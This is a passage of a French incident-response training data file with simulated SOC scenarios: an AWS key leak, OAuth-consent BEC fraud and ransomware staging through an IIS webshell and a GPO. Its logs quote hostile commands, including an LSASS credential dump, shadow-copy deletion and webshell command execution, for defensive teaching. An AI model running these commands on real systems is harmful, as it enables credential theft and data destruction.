          'Utiliser la fédération OIDC (AssumeRoleWithWebIdentity) avec jetons temporaires STS',
          'Partager le compte root AWS entre tous les développeurs',
          'Désactiver CloudTrail pour accélérer les builds',
        ],
        correctIndex: 1,
        explanation:
          'La fédération OIDC émet des jetons éphémères STS scopés au dépôt et au rôle précis, sans aucune clé statique à fuiter.',
        evidenceLogId: 'cld-l3',
      },
    ],
    remediationActions: [
      {
        id: 'cld-r1',
        label: 'Révoquer immédiatement AKIA5X92M81P9F2Q ET la clé backdoor AKIA5X92BACKDOOR',
        category: 'Confinement',
        isRecommended: true,
        rationale: 'Élimine simultanément l’accès initial et la persistance IAM.',
      },
      {
        id: 'cld-r2',
        label: 'Supprimer la Bucket Policy publique et activer S3 Block Public Access au niveau du compte',
        category: 'Confinement',
        isRecommended: true,
        rationale: 'Referme immédiatement l’exposition Internet de tous les buckets.',
      },
      {
        id: 'cld-r3',
        label: 'Retirer AdministratorAccess de ci-deploy-bot et migrer vers des rôles OIDC à moindre privilège',
        category: 'Éradication',
        isRecommended: true,
        rationale: 'Supprime définitivement les clés statiques et l’excès de privilèges.',
      },
      {
        id: 'cld-r4',
        label: 'Activer GitHub Secret Scanning Push Protection et nettoyer l’historique Git du dépôt',
        category: 'Récupération',
        isRecommended: true,
        rationale: 'Empêche tout futur push contenant des secrets Cloud.',
      },
      {
        id: 'cld-r5',
        label: 'Se contenter de supprimer le fichier .env.backup dans un nouveau commit sans révoquer les clés',
        category: 'Confinement',
        isRecommended: false,
        rationale: 'Inefficace : une clé exposée publiquement est déjà collectée et reste active tant qu’elle n’est pas révoquée.',
      },
      {
        id: 'cld-r6',
        label: 'Désactiver CloudTrail pour réduire les coûts pendant l’enquête',
        category: 'Récupération',
        isRecommended: false,
        rationale: 'Rend l’équipe aveugle aux actions restantes de l’attaquant.',
      },
    ],
    postMortem: {
      rootCause:
        'Clé statique IAM dotée d’AdministratorAccess poussée sur un dépôt Git public + S3 Block Public Access désactivé.',
      dwellTime: '10 minutes entre le commit public (09:12) et le début de l’exfiltration S3 (09:22).',
      keyIocs: [
        'Clé fuitée : AKIA5X92M81P9F2Q · Clé backdoor : AKIA5X92BACKDOOR',
        'IP attaquant : 104.244.76.13',
        'Bucket exposé : s3://logiflow-exports-prod (418 Mo exfiltrés)',
      ],
      hardeningLessons: [
        'Bannir les clés IAM statiques au profit d’AWS STS + OIDC et des SCP (Service Control Policies).',
        'Activer S3 Block Public Access à l’échelle de l’organisation AWS.',
        'Imposer le blocage de secrets en pré-commit et côté GitHub Push Protection.',
      ],
    },
  },
  {
    id: 'inc-m365-oauth-bec',
    ticketId: 'INC-2026-045',
    title: 'Fraude au Président (BEC), Consentement OAuth & Règle Exchange Masquée',
    domain: 'Messagerie & Phishing',
    organization: 'Cabinet Juridique Delacroix',
    sector: 'Conseil & Juridique',
    environment: 'Microsoft 365 / Entra ID + Exchange Online',
    severity: 'P2 — Élevée',
    slaMinutes: 40,
    estimatedMinutes: 10,
    xpReward: 150,
    relatedCourseIds: [23, 10, 25],
    mitreTechniques: [
      { id: 'T1566.002', name: 'Spearphishing avec lien OAuth illicite' },
      { id: 'T1528', name: 'Vol de jeton OAuth (Mail.ReadWrite)' },
      { id: 'T1564.008', name: 'Règle de boîte masquant les réponses' },
    ],
    summary:
      'Le directeur financier signale une tentative de changement de RIB frauduleux de 185 000 € alors qu’il n’a reçu aucun avertissement du fournisseur dans sa boîte de réception.',
    initialAlert:
      'Alerte Exchange Audit #77301 : Création d’une règle InboxRule masquant les mots-clés "RIB / Facture / Virement" vers RSS Feeds peu après un consentement OAuth suspect.',
    businessImpact:
      'Risque de virement frauduleux de 185 000 € et lecture silencieuse des dossiers juridiques confidentiels.',
    assets: [
      {
        id: 'm-a1',
        name: 'daf@delacroix-avocats.fr',
        role: 'Boîte Direction Financière',
        ip: 'M365 Tenant',
        os: 'Exchange Online',
        status: 'Compromis',
      },
      {
        id: 'm-a2',
        name: 'App OAuth "DocuSign-Viewer-Pro"',
        role: 'Application tierce non vérifiée',
        ip: 'AppId: 88a2-f91c',
        os: 'Entra ID Enterprise App',
        status: 'Compromis',
      },
      {
        id: 'm-a3',
        name: 'Passerelle SMTP SEG-01',
        role: 'Filtrage SPF/DKIM/DMARC',
        ip: '198.51.100.25',
        os: 'Email Gateway',
        status: 'Nominal',
      },
    ],
    logs: [
      {
        id: 'bec-l1',
        timestamp: '2026-11-25 10:04:18',
        source: 'SMTP Gateway',
        host: 'SEG-01',
        severity: 'ALERTE',
        eventCode: 'DMARC-FAIL',
        actor: 'billing@fournisseur-typosquat.co',
        srcIp: '185.234.72.14',
        dstIp: '198.51.100.25',
        summary: 'E-mail ciblé envoyé à daf@delacroix-avocats.fr avec domaine sosie (SPF=pass sur sosie, lien OAuth).',
        rawPayload:
          '{"From":"billing@fournisseur-typosquat.co","To":"daf@delacroix-avocats.fr","Subject":"Avenant contrat 2026 - Signature requise","SPF":"pass(lookalike)","DKIM":"none","DMARC":"p=none","Link":"https://login.microsoftonline.com/common/oauth2/authorize?client_id=88a2-f91c"}',
        isEvidence: true,
        killChainPhase: '1 · Livraison Spearphishing (Domaine sosie)',
        analystNote: 'Preuve clé : domaine sosie piégeant le DAF vers un écran de consentement OAuth Microsoft réel.',
      },
      {
        id: 'bec-l2',
        timestamp: '2026-11-25 10:07:55',
        source: 'Entra ID Audit',
        host: 'entra.microsoft.com',
        severity: 'CRITIQUE',
        eventCode: 'ConsentToApp',
        actor: 'daf@delacroix-avocats.fr',
        srcIp: '90.83.14.201',
        dstIp: '40.126.32.10',
        summary: 'Consentement utilisateur accordé à l’application non vérifiée "DocuSign-Viewer-Pro" (Mail.ReadWrite, Mail.Send, offline_access).',
        rawPayload:
          '{"Operation":"Consent to application","User":"daf@delacroix-avocats.fr","AppDisplayName":"DocuSign-Viewer-Pro","AppId":"88a2-f91c-4402","VerifiedPublisher":false,"Scopes":"Mail.ReadWrite Mail.Send offline_access"}',
        isEvidence: true,
        killChainPhase: '2 · Consentement OAuth illicite (Contournement MFA)',
        analystNote: 'Preuve clé : l’application obtient un refresh token durable (offline_access) sans jamais voler le mot de passe ni le MFA.',
      },
      {
        id: 'bec-l3',
        timestamp: '2026-11-25 10:09:12',
        source: 'Entra ID Sign-In',
        host: 'entra.microsoft.com',
        severity: 'INFO',
        eventCode: 'SignIn-OK',
        actor: 'associe1@delacroix-avocats.fr',
        srcIp: '90.83.14.201',
        dstIp: '40.126.32.10',
        summary: 'Connexion Outlook Desktop normale depuis l’IP du cabinet à Paris.',
        rawPayload:
          '{"User":"associe1@delacroix-avocats.fr","App":"Microsoft Outlook","IP":"90.83.14.201","MFA":"Satisfied","Status":"Success"}',
        isEvidence: false,
        analystNote: 'Activité normale depuis les locaux du cabinet.',
      },
      {
        id: 'bec-l4',
        timestamp: '2026-11-25 10:12:44',
        source: 'Exchange Audit',
        host: 'outlook.office365.com',
        severity: 'CRITIQUE',
        eventCode: 'New-InboxRule',
        actor: 'App:88a2-f91c (as daf)',
        srcIp: '45.95.147.209',
        dstIp: '52.96.165.10',
        summary: 'Création d’une règle cachée "." déplaçant tout mail contenant "RIB", "virement" ou "facture" vers RSS Feeds + MarkAsRead.',
        rawPayload:
          '{"Operation":"New-InboxRule","UserId":"daf@delacroix-avocats.fr","ClientIP":"45.95.147.209","Parameters":{"Name":".","SubjectOrBodyContainsWords":["RIB","virement","facture"],"MoveToFolder":"RSS Feeds","MarkAsRead":true}}',
        isEvidence: true,
        killChainPhase: '3 · Dissimulation (Règle Exchange)',
        analystNote: 'Preuve clé : empêche le DAF de voir les alertes du vrai fournisseur.',
      },
      {
        id: 'bec-l5',
        timestamp: '2026-11-25 10:15:30',
        source: 'Exchange Audit',
        host: 'outlook.office365.com',
        severity: 'CRITIQUE',
        eventCode: 'Send-Mail',
        actor: 'App:88a2-f91c (as daf)',
        srcIp: '45.95.147.209',
        dstIp: '52.96.165.10',
        summary: 'Envoi d’un e-mail frauduleux depuis la VRAIE boîte du DAF vers la comptabilité validant un nouveau RIB bancaire.',
        rawPayload:
          '{"Operation":"Send","Mailbox":"daf@delacroix-avocats.fr","To":"compta@delacroix-avocats.fr","Subject":"RE: Facture 185k€ - Nouveau RIB validé","AppId":"88a2-f91c-4402","ClientIP":"45.95.147.209"}',
        isEvidence: true,
        killChainPhase: '4 · Fraude financière (Usurpation interne)',
        analystNote: 'Preuve clé : l’application OAuth utilise le scope Mail.Send pour envoyer l’ordre de virement frauduleux.',
      },
      {
        id: 'bec-l6',
        timestamp: '2026-11-25 10:18:01',
        source: 'SMTP Gateway',
        host: 'SEG-01',
        severity: 'INFO',
        eventCode: 'DMARC-PASS',
        actor: 'notifications@urssaf.fr',
        srcIp: '193.54.112.10',
        dstIp: '198.51.100.25',
        summary: 'Courriel institutionnel authentifié (SPF=pass, DKIM=pass, DMARC=pass).',
        rawPayload:
          '{"From":"notifications@urssaf.fr","SPF":"pass","DKIM":"pass","DMARC":"pass"}',
        isEvidence: false,
        analystNote: 'Courriel légitime authentifié.',
      },
    ],
    forensicCommands: [
      {
        id: 'bec-cmd-1',
        tool: 'Exchange PowerShell',
        command: 'Get-InboxRule -Mailbox daf@delacroix-avocats.fr | Format-List Name,Description,MoveToFolder',
        description: 'Lister les règles de boîte aux lettres actives sur le compte du DAF.',
        output: `Name         : .
Enabled      : True
Description  : Si le sujet ou le corps contient 'RIB', 'virement' ou 'facture',
               marquer comme lu et déplacer vers le dossier 'RSS Feeds'.`,
      },
      {
        id: 'bec-cmd-2',
        tool: 'Microsoft Graph',
        command: 'Get-MgOauth2PermissionGrant -Filter "clientId eq \'88a2-f91c-4402\'"',
        description: 'Inspecter les autorisations OAuth déléguées accordées à l’application tierce.',
        output: `ClientId         : 88a2-f91c-4402 (DocuSign-Viewer-Pro — Éditeur NON vérifié)
ConsentType      : Principal (daf@delacroix-avocats.fr)
Scope            : Mail.ReadWrite Mail.Send offline_access
[RISQUE] L'accès persiste même après changement de mot de passe tant que le grant OAuth n'est pas révoqué.`,
      },
      {
        id: 'bec-cmd-3',
        tool: 'DNS / DMARC Check',
        command: 'dig +short TXT _dmarc.delacroix-avocats.fr',
        description: 'Vérifier la politique DMARC publiée par le cabinet.',
        output: `"v=DMARC1; p=none; rua=mailto:dmarc@delacroix-avocats.fr"
[RECOMMANDATION] Passer à p=quarantine puis p=reject et bloquer le consentement utilisateur OAuth.`,
      },
    ],
    questions: [
      {
        id: 'bec-q1',
        prompt: 'Pourquoi l’attaquant n’a-t-il pas eu besoin de contourner le MFA lors des appels Exchange ?',
        hint: 'Regardez le log Entra ID ConsentToApp et les scopes OAuth.',
        options: [
          'Le DAF avait accordé un consentement OAuth (Mail.ReadWrite, Mail.Send, offline_access) à une app malveillante',
          'Le pare-feu SEG-01 avait désactivé TLS',
          'L’attaquant se trouvait physiquement sur l’IP 90.83.14.201',
          'Le compte associe1 a transféré son mot de passe',
        ],
        correctIndex: 0,
        explanation:
          'L’attaque par Illicit Consent Grant fournit un jeton OAuth/refresh token légitime au nom de l’utilisateur, rendant le MFA inopérant pour les appels API Graph/Exchange.',
        evidenceLogId: 'bec-l2',
      },
      {
        id: 'bec-q2',
        prompt: 'Comment l’attaquant empêche-t-il le DAF de voir les réponses du fournisseur ?',
        hint: 'Consultez Exchange Audit New-InboxRule.',
        options: [
          'En supprimant le domaine DNS du fournisseur',
          'Via une règle de boîte nommée "." déplaçant les mots-clés RIB/virement/facture vers RSS Feeds en les marquant lus',
          'En éteignant le PC du DAF à distance',
          'En bloquant le port SMTP 25 sur le poste',
        ],
        correctIndex: 1,
        explanation:
          'Les règles discrètes nommées "." qui déplacent vers RSS Feeds et marquent comme lu sont un grand classique des attaques BEC.',
        evidenceLogId: 'bec-l4',
      },
      {
        id: 'bec-q3',
        prompt: 'Que se passe-t-il si l’on change uniquement le mot de passe du DAF sans révoquer l’application OAuth ?',
        hint: 'Lisez la sortie Microsoft Graph Get-MgOauth2PermissionGrant.',
        options: [
          'L’attaque est totalement arrêtée',
          'L’application OAuth conserve son accès Mail.ReadWrite / Mail.Send grâce à son jeton délégué',
          'La règle Exchange se supprime automatiquement',
          'Les e-mails déplacés reviennent seuls dans la boîte de réception',
        ],
        correctIndex: 1,
        explanation:
          'Il est impératif de révoquer l’OAuth2PermissionGrant, les refresh tokens (Revoke-MgUserSignInSession) ET de supprimer la règle Exchange.',
        evidenceLogId: 'bec-l2',
      },
      {
        id: 'bec-q4',
        prompt: 'Quelle mesure de gouvernance Entra ID prévient définitivement ce type d’attaque ?',
        hint: 'Comment empêcher un collaborateur d’approuver une app non vérifiée ?',
        options: [
          'Désactiver la réception d’e-mails externes',
          'Restreindre le consentement OAuth aux seuls administrateurs (Admin Consent Workflow)',
          'Supprimer les dossiers RSS Feeds',
          'Passer DMARC à p=none',
        ],
        correctIndex: 1,
        explanation:
          'Activer le workflow d’approbation administrateur bloque tout consentement utilisateur vers des applications non vérifiées.',
        evidenceLogId: 'bec-l2',
      },
    ],
    remediationActions: [
      {
        id: 'bec-r1',
        label: 'Alerter immédiatement la comptabilité et geler le virement de 185 000 € (contre-appel téléphonique)',
        category: 'Confinement',
        isRecommended: true,
        rationale: 'Protège immédiatement la trésorerie avant l’exécution bancaire.',
      },
      {
        id: 'bec-r2',
        label: 'Supprimer l’application OAuth "DocuSign-Viewer-Pro" (88a2-f91c) et révoquer toutes les sessions Entra ID',
        category: 'Confinement',
        isRecommended: true,
        rationale: 'Coupe instantanément les jetons d’accès API et refresh tokens.',
      },
      {
        id: 'bec-r3',
        label: 'Supprimer la règle malveillante "." sur Exchange Online et restaurer les e-mails depuis RSS Feeds',
        category: 'Éradication',
        isRecommended: true,
        rationale: 'Rétablit la visibilité complète de la boîte et supprime la dissimulation.',
      },
      {
        id: 'bec-r4',
        label: 'Désactiver le consentement OAuth utilisateur dans Entra ID et durcir DMARC vers p=reject',
        category: 'Récupération',
        isRecommended: true,
        rationale: 'Supprime durablement ce vecteur sur tout le cabinet.',
      },
      {
        id: 'bec-r5',
        label: 'Réinitialiser uniquement le mot de passe du DAF sans toucher aux apps Entra ID ni aux règles',
        category: 'Éradication',
        isRecommended: false,
        rationale: 'Laisse l’application OAuth et la règle de masquage entièrement actives.',
      },
      {
        id: 'bec-r6',
        label: 'Supprimer définitivement la boîte aux lettres du DAF et ses journaux d’audit',
        category: 'Récupération',
        isRecommended: false,
        rationale: 'Détruit les preuves nécessaires à l’enquête et bloque l’activité du cabinet.',
      },
    ],
    postMortem: {
      rootCause:
        'Consentement utilisateur autorisé par défaut sur Entra ID exploité par un spearphishing OAuth (DocuSign-Viewer-Pro).',
      dwellTime: '11 minutes entre le clic initial (10:04) et l’envoi du faux ordre de RIB (10:15).',
      keyIocs: [
        'Domaine sosie : fournisseur-typosquat.co',
        'AppId OAuth : 88a2-f91c-4402 (DocuSign-Viewer-Pro)',
        'IP API Exchange : 45.95.147.209 · Règle Exchange : "."',
      ],
      hardeningLessons: [
        'Bloquer le consentement utilisateur OAuth et imposer le flux d’approbation administrateur.',
        'Mettre en place une procédure de double validation hors-bande pour tout changement de RIB.',
        'Déployer des alertes SIEM sur New-InboxRule ciblant RSS Feeds ou mots-clés financiers.',
      ],
    },
  },
  {
    id: 'inc-iis-gpo-ransom',
    ticketId: 'INC-2026-046',
    title: 'Pré-Déploiement Ransomware via Webshell IIS & Modification GPO Critique',
    domain: 'Ransomware & IIS',
    organization: 'Logistique Atlantique',
    sector: 'Transport & Entrepôts',
    environment: 'Windows Server IIS (DMZ) + Active Directory (DC02)',
    severity: 'P1 — Critique',
    slaMinutes: 20,
    estimatedMinutes: 13,
    xpReward: 150,
    relatedCourseIds: [30, 31, 25],
    mitreTechniques: [
      { id: 'T1505.003', name: 'Webshell ASPX sur IIS' },
      { id: 'T1490', name: 'Suppression des Shadow Copies (vssadmin)' },
      { id: 'T1484.001', name: 'Déploiement de masse via GPO Active Directory' },
    ],
    summary:
      'Un fichier ASPX suspect apparaît sur le portail IIS de suivi colis, suivi d’une exécution vssadmin et d’une tâche planifiée injectée dans une GPO liée à la racine du domaine.',
    initialAlert:
      'Alerte SOC Critique #99104 : Event 5136 (Modification GPO Default Domain Policy) + Sysmon Event 1 (vssadmin delete shadows /all /quiet) en pré-chiffrement.',
    businessImpact:
      'Sans confinement dans les 20 minutes, le rafraîchissement gpupdate (90 min) chiffrera les 650 postes et serveurs de l’entreprise.',
    assets: [
      {
        id: 'r-a1',
        name: 'SRV-WEB-IIS01',
        role: 'Portail suivi colis IIS 10',
        ip: '172.18.5.10',
        os: 'Windows Server 2022',
        status: 'Compromis',
      },
      {
        id: 'r-a2',
        name: 'DC02.ATLANTIQUE.AD',
        role: 'Contrôleur de domaine & SYSVOL',
        ip: '10.50.1.11',
        os: 'Windows Server 2022',
        status: 'Compromis',
      },
      {
        id: 'r-a3',
        name: 'SRV-BACKUP-IMMUT',
        role: 'Coffre de sauvegarde immuable (Air-Gap)',
        ip: '10.50.99.5',
        os: 'Linux Hardened Repo',
        status: 'Nominal',
      },
    ],
    logs: [
      {
        id: 'rn-l1',
        timestamp: '2026-11-25 22:10:04',
        source: 'IIS W3C Logs',
        host: 'SRV-WEB-IIS01',
        severity: 'CRITIQUE',
        eventCode: 'HTTP 200',
        actor: 'IIS APPPOOL\\SuiviColis',
        srcIp: '193.32.162.89',
        dstIp: '172.18.5.10',
        summary: 'Exécution de commandes via webshell POST /uploads/logo_sync.aspx (statut 200).',
        rawPayload:
          '2026-11-25 22:10:04 172.18.5.10 POST /uploads/logo_sync.aspx cmd=whoami&args=/priv 443 - 193.32.162.89 Mozilla/5.0 200 0 0 142',
        isEvidence: true,
        killChainPhase: '1 · Accès initial (Webshell IIS ASPX)',
        analystNote: 'Preuve clé : webshell ASPX actif dans le dossier /uploads accessible en exécution.',
      },
      {
        id: 'rn-l2',
        timestamp: '2026-11-25 22:11:30',
        source: 'IIS W3C Logs',
        host: 'SRV-WEB-IIS01',
        severity: 'INFO',
        eventCode: 'HTTP 200',
        actor: 'Client Web',
        srcIp: '82.120.44.19',
        dstIp: '172.18.5.10',
        summary: 'Consultation normale GET /tracking?id=ATL-99402.',
        rawPayload:
          '2026-11-25 22:11:30 172.18.5.10 GET /tracking id=ATL-99402 443 - 82.120.44.19 Chrome/130 200 0 0 38',
        isEvidence: false,
        analystNote: 'Trafic client normal de suivi de colis.',
      },
      {
        id: 'rn-l3',
        timestamp: '2026-11-25 22:14:17',
        source: 'Sysmon',
        host: 'SRV-WEB-IIS01',
        severity: 'CRITIQUE',
        eventCode: 'Event 1',
        actor: 'NT AUTHORITY\\SYSTEM',
        srcIp: '172.18.5.10',
        dstIp: '172.18.5.10',
        summary: 'w3wp.exe lance cmd.exe puis procdump64.exe -ma lsass.exe pour extraire les identifiants en mémoire.',
        rawPayload:
          '{"EventID":1,"ParentImage":"C:\\\\Windows\\\\System32\\\\inetsrv\\\\w3wp.exe","Image":"C:\\\\ProgramData\\\\procdump64.exe","CommandLine":"procdump64.exe -accepteula -ma lsass.exe C:\\\\ProgramData\\\\l.dmp","IntegrityLevel":"System"}',
        isEvidence: true,
        killChainPhase: '2 · Dump LSASS (Vol d’identifiants Admin)',
        analystNote: 'Preuve clé : un compte Domain Admin s’était connecté en RDP sur SRV-WEB-IIS01, laissant ses secrets dans LSASS.',
      },
      {
        id: 'rn-l4',
        timestamp: '2026-11-25 22:18:42',
        source: 'Windows Security',
        host: 'DC02',
        severity: 'CRITIQUE',
        eventCode: '5136',
        actor: 'ATLANTIQUE\\adm.legacy',
        srcIp: '172.18.5.10',
        dstIp: '10.50.1.11',
        summary: 'Modification suspecte de la Default Domain Policy (ajout d’une tâche planifiée immédiate exécutant \\\\DC02\\SYSVOL\\crypt_stage.exe).',
        rawPayload:
          '{"EventID":5136,"SubjectUserName":"adm.legacy","ObjectDN":"CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=atlantique,DC=ad","Attribute":"gPCMachineExtensionNames","ScheduledTask":"\\\\DC02\\\\SYSVOL\\\\atlantique.ad\\\\scripts\\\\crypt_stage.exe"}',
        isEvidence: true,
        killChainPhase: '3 · Préparation déploiement de masse (GPO)',
        analystNote: 'Preuve clé : détournement de la Default Domain Policy pour lancer le ransomware sur tout le parc.',
      },
      {
        id: 'rn-l5',
        timestamp: '2026-11-25 22:20:09',
        source: 'Sysmon',
        host: 'SRV-WEB-IIS01',
        severity: 'CRITIQUE',
        eventCode: 'Event 1',
        actor: 'ATLANTIQUE\\adm.legacy',
        srcIp: '172.18.5.10',
        dstIp: '172.18.5.10',
        summary: 'Inhibition de la récupération : vssadmin.exe delete shadows /all /quiet exécuté.',
        rawPayload:
          '{"EventID":1,"Image":"C:\\\\Windows\\\\System32\\\\vssadmin.exe","CommandLine":"vssadmin.exe delete shadows /all /quiet","User":"ATLANTIQUE\\\\adm.legacy"}',
        isEvidence: true,
        killChainPhase: '4 · Destruction des Shadow Copies (Pré-chiffrement)',
        analystNote: 'Preuve clé : indicateur ultime d’imminence de chiffrement ransomware.',
      },
      {
        id: 'rn-l6',
        timestamp: '2026-11-25 22:21:15',
        source: 'Firewall',
        host: 'FW-DMZ-01',
        severity: 'INFO',
        eventCode: 'DENY',
        actor: 'SRV-WEB-IIS01',
        srcIp: '172.18.5.10',
        dstIp: '10.50.99.5',
        summary: 'Tentative de connexion SMB/SSH vers SRV-BACKUP-IMMUT bloquée par le pare-feu de segmentation.',
        rawPayload:
          '{"Action":"DENY","Rule":"R-BLOCK-TO-IMMUTABLE-BACKUP","SrcIP":"172.18.5.10","DstIP":"10.50.99.5","DstPort":445}',
        isEvidence: false,
        analystNote: 'Bonne nouvelle : la segmentation du coffre de sauvegarde immuable a tenu !',
      },
    ],
    forensicCommands: [
      {
        id: 'rn-cmd-1',
        tool: 'AD GPO Audit',
        command: 'Get-GPOReport -Name "Default Domain Policy" -ReportType Xml | Select-String "crypt_stage"',
        description: 'Vérifier la tâche planifiée malveillante injectée dans la GPO par défaut.',
        output: `<ImmediateTaskV2 name="SystemUpdateCheck" runAs="NT AUTHORITY\\SYSTEM">
  <Command>\\\\DC02\\SYSVOL\\atlantique.ad\\scripts\\crypt_stage.exe</Command>
  <Arguments>--encrypt --threads 8</Arguments>
</ImmediateTaskV2>
[URGENCE] Prochain cycle gpupdate automatique des postes : dans 18 minutes !`,
      },
      {
        id: 'rn-cmd-2',
        tool: 'IIS Config',
        command: 'Get-WebConfigurationProperty -Filter "system.webServer/handlers" -PSPath "IIS:\\Sites\\SuiviColis\\uploads"',
        description: 'Auditer si l’exécution de scripts ASPX est autorisée dans le répertoire uploads.',
        output: `AccessPolicy : Read, Script  [VULNÉRABLE : l'exécution Script doit être désactivée sur /uploads]`,
      },
      {
        id: 'rn-cmd-3',
        tool: 'Backup Check',
        command: 'backup-cli verify --repo SRV-BACKUP-IMMUT',
        description: 'Contrôler l’intégrité du dépôt de sauvegarde immuable.',
        output: `Statut Dépôt : INTACT (Verrouillage WORM immuable actif 30 jours)
Dernier snapshot AD + Serveurs : 2026-11-25 21:00 UTC (sain, antérieur à l'intrusion).`,
      },
    ],
    questions: [
      {
        id: 'rn-q1',
        prompt: 'Comment l’attaquant a-t-il obtenu les identifiants du compte Domain Admin adm.legacy ?',
        hint: 'Regardez Sysmon Event 1 à 22:14:17 sur SRV-WEB-IIS01.',
        options: [
          'En extrayant la mémoire de lsass.exe avec procdump64.exe lancé depuis w3wp.exe',
          'En piratant le serveur de sauvegarde immuable SRV-BACKUP-IMMUT',
          'Via une requête client /tracking',
          'En lisant les logs IIS',
        ],
        correctIndex: 0,
        explanation:
          'Un administrateur de domaine (adm.legacy) avait ouvert une session sur un serveur DMZ exposé, permettant le dump LSASS après compromission IIS.',
        evidenceLogId: 'rn-l3',
      },
      {
        id: 'rn-q2',
        prompt: 'Par quel mécanisme l’attaquant s’apprête-t-il à chiffrer les 650 postes simultanément ?',
        hint: 'Consultez l’événement Windows Security 5136 et la commande Get-GPOReport.',
        options: [
          'Par un e-mail de phishing interne',
          'Par une tâche planifiée immédiate injectée dans la GPO Default Domain Policy pointant vers SYSVOL',
          'Par le protocole DHCP',
          'Par une mise à jour Linux apt',
        ],
        correctIndex: 1,
        explanation:
          'Event 5136 montre la modification de la Default Domain Policy pour exécuter \\\\DC02\\SYSVOL\\...\\crypt_stage.exe en SYSTEM.',
        evidenceLogId: 'rn-l4',
      },
      {
        id: 'rn-q3',
        prompt: 'Quel événement confirme que le chiffrement est imminent ?',
        hint: 'Observez la commande système exécutée à 22:20:09.',
        options: [
          'GET /tracking?id=ATL-99402',
          'vssadmin.exe delete shadows /all /quiet',
          'DENY vers 10.50.99.5',
          'backup-cli verify',
        ],
        correctIndex: 1,
        explanation:
          'La suppression silencieuse des clichés instantanés (Volume Shadow Copies) précède immédiatement le chiffrement ransomware.',
        evidenceLogId: 'rn-l5',
      },
      {
        id: 'rn-q4',
        prompt: 'Quelle configuration IIS a permis l’exécution du webshell logo_sync.aspx ?',
        hint: 'Vérifiez la sortie de la commande IIS Config.',
        options: [
          'HTTPS sur le port 443',
          'L’exécution de scripts (AccessPolicy: Script) laissée active dans le dossier /uploads',
          'L’utilisation de Windows Server 2022',
          'Le pare-feu FW-DMZ-01',
        ],
        correctIndex: 1,
        explanation:
          'Un répertoire d’upload ne doit jamais autoriser l’exécution de scripts serveur (.aspx/.php).',
        evidenceLogId: 'rn-l1',
      },
    ],
    remediationActions: [
      {
        id: 'rn-r1',
        label: 'Supprimer immédiatement crypt_stage.exe de SYSVOL et restaurer la GPO Default Domain Policy saine',
        category: 'Confinement',
        isRecommended: true,
        rationale: 'Empêche le déclenchement massif du ransomware au prochain cycle gpupdate.',
      },
      {
        id: 'rn-r2',
        label: 'Désactiver adm.legacy, isoler SRV-WEB-IIS01 et bloquer les flux DMZ -> AD (DC02)',
        category: 'Confinement',
        isRecommended: true,
        rationale: 'Coupe l’attaquant de la DMZ et stoppe tout contrôle sur l’annuaire.',
      },
      {
        id: 'rn-r3',
        label: 'Reconstruire SRV-WEB-IIS01 depuis une image saine, désactiver Script sur /uploads et activer Credential Guard',
        category: 'Éradication',
        isRecommended: true,
        rationale: 'Éradique le webshell et protège LSASS contre les dumps mémoire.',
      },
      {
        id: 'rn-r4',
        label: 'Double rotation KRBTGT, audit complet des comptes privilégiés et déploiement strict du Tiering AD + LAPS',
        category: 'Récupération',
        isRecommended: true,
        rationale: 'Interdit à un Domain Admin de se connecter en DMZ (Tier 0 séparé du Tier 2/DMZ).',
      },
      {
        id: 'rn-r5',
        label: 'Lancer gpupdate /force sur tous les postes avant d’avoir nettoyé la GPO',
        category: 'Confinement',
        isRecommended: false,
        rationale: 'Erreur fatale : déclencherait immédiatement le déploiement du ransomware sur tout le parc !',
      },
      {
        id: 'rn-r6',
        label: 'Payer la rançon sans vérifier les sauvegardes immuables pourtant intactes',
        category: 'Récupération',
        isRecommended: false,
        rationale: 'Inutile et dangereux : le coffre SRV-BACKUP-IMMUT est 100% intact.',
      },
    ],
    postMortem: {
      rootCause:
        'Exécution ASPX autorisée dans IIS /uploads + violation du Tiering AD (compte Domain Admin connecté sur un serveur DMZ, exposé dans LSASS).',
      dwellTime: '10 minutes entre le webshell (22:10) et la suppression Shadow Copies (22:20) — contenu avant chiffrement global.',
      keyIocs: [
        'IP Exploit : 193.32.162.89 · Webshell : /uploads/logo_sync.aspx',
        'Outil dump : C:\\ProgramData\\procdump64.exe -> l.dmp',
        'Payload SYSVOL : \\\\DC02\\SYSVOL\\atlantique.ad\\scripts\\crypt_stage.exe',
      ],
      hardeningLessons: [
        'Interdire l’exécution de scripts dans les répertoires d’upload IIS et activer Credential Guard + RunAsPPL.',
        'Appliquer strictement le Tiering AD (un Domain Admin ne s’authentifie jamais en DMZ).',
        'Maintenir des sauvegardes immuables (WORM) isolées du domaine Active Directory.',
      ],
    },
  },
  {
    id: 'inc-dns-tunnel-c2',
    ticketId: 'INC-2026-047',
    title: 'Exfiltration Furtive par Tunneling DNS & Tâche Planifiée Poste Développeur',
    domain: 'Réseau & SIEM',
    organization: 'Atelier Robotique Horizon',
    sector: 'R&D & Propriété Intellectuelle',
    environment: 'Réseau LAN R&D · Résolveur DNS Interne + Zeek / Suricata',
    severity: 'P2 — Élevée',
    slaMinutes: 45,
    estimatedMinutes: 10,
    xpReward: 150,
    relatedCourseIds: [2, 24, 16],
    mitreTechniques: [
      { id: 'T1071.004', name: 'Tunneling DNS (Requêtes TXT haute entropie)' },
      { id: 'T1053.005', name: 'Persistance via tâche planifiée' },
      { id: 'T1195.002', name: 'Paquet npm compromis (Supply Chain)' },
    ],
    summary:
      'Le capteur Zeek détecte plus de 4 800 requêtes DNS TXT inhabituelles à très forte entropie vers le domaine cdn-metrics-telemetry.xyz émises par un poste R&D isolé sans accès HTTP direct.',
    initialAlert:
      'Alerte Suricata/Zeek #51902 : Anomalie d’entropie DNS (Shannon 4.62) depuis WKST-RD-09 vers *.cdn-metrics-telemetry.xyz (4 812 requêtes en 15 min).',
    businessImpact:
      'Exfiltration silencieuse de plans CAO et clés de signature firmware malgré l’absence d’accès web direct du VLAN R&D.',
    assets: [
      {
        id: 'd-a1',
        name: 'WKST-RD-09',
        role: 'Poste ingénieur firmware (VLAN R&D isolé)',
        ip: '10.60.12.27',
        os: 'Windows 11 Pro',
        status: 'Compromis',
      },
      {
        id: 'd-a2',
        name: 'DNS-INT-01',
        role: 'Serveur DNS récursif interne',
        ip: '10.60.1.53',
        os: 'Linux BIND9',
        status: 'Suspect',
      },
      {
        id: 'd-a3',
        name: 'GIT-RD-LOCAL',
        role: 'Serveur Git interne CAO/Firmware',
        ip: '10.60.10.4',
        os: 'Ubuntu 24.04',
        status: 'Nominal',
      },
    ],
    logs: [
      {
